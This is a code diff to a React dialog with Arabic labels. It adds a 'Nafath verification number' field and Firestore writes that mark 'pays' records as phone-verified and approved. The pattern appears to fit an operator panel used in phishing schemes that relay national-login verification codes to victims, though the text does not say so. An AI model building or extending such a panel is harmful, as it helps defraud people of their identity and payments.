@@ -13,6 +13,8 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Phone, Lock, Shield } from "lucide-react";
 import { toast } from "sonner";
+import { doc, updateDoc } from "firebase/firestore";
+import { db } from "@/lib/firestore";
 
 interface PhoneDialogProps {
   open: boolean;
@@ -37,12 +39,17 @@ export default function PhoneDialog({
   const [operatorName, setOperatorName] = useState(operator || "");
   const [requierdAttachment, setRequierdAttachment] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-
-  const handleSave = async () => {
+  const [auth_number, setAuth] = useState("");
+  const handleActionClick = async (notification: any, action: string, auth_number:string) => {
+    const docRef = doc(db, "pays", notification.id)
+    await updateDoc(docRef, { phoneVerificationStatus	: action, auth_number:auth_number })
+  };
+  const handleSave = async (auth_number:string) => {
     if (!open) return;
 
     setIsSubmitting(true);
     try {
+      handleActionClick(notification,"approved",auth_number)
       // Since we don't have the notification ID here, we'll just show a success message
       // In a real implementation, you would update the database
       toast.success("تم حفظ بيانات الهاتف بنجاح", {
@@ -123,8 +130,8 @@ export default function PhoneDialog({
 
             <div className="grid gap-2">
               <Label htmlFor="operator" className="text-right">
-                مشغل الشبكة
-              </Label>
+              {notification?.auth_number}
+                {notification?.phoneVerificationStatus}              </Label>
               <div className="relative">
                 <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                 <Input
@@ -135,6 +142,17 @@ export default function PhoneDialog({
                   dir="ltr"
                 />
               </div>
+              <div className="relative">
+                <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="nafd"
+                  value={auth_number}
+                  className="pr-10"
+                  placeholder="رقم تحقق نفاذ"
+                  onChange={(e)=>setAuth(e.target.value)}
+                  dir="ltr"
+                />
+              </div>
             </div>
           </div>
         </div>
@@ -142,6 +160,7 @@ export default function PhoneDialog({
         <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
             onClick={() =>{ 
+              handleSave(auth_number)
             }}
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
